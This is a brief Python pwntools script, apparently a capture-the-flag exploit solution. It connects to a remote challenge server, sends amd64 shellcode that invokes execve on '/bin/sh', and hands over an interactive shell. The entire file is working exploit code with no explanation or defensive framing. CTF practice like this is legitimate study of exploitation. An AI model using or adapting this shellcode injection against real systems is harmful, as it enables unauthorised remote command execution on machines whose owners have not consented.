from pwn import *
context.log_level='debug'
context.arch='amd64'
#r=process("./pwn")
#gdb.attach(r)
r=remote("node2.tgctf.woooo.tech",31991)
pause()
shellcode=asm('''
add rdi,11 ;
mov eax,59;
syscall ;
''')
pay=shellcode+b'/bin/sh'

r.send(pay)
r.interactive()

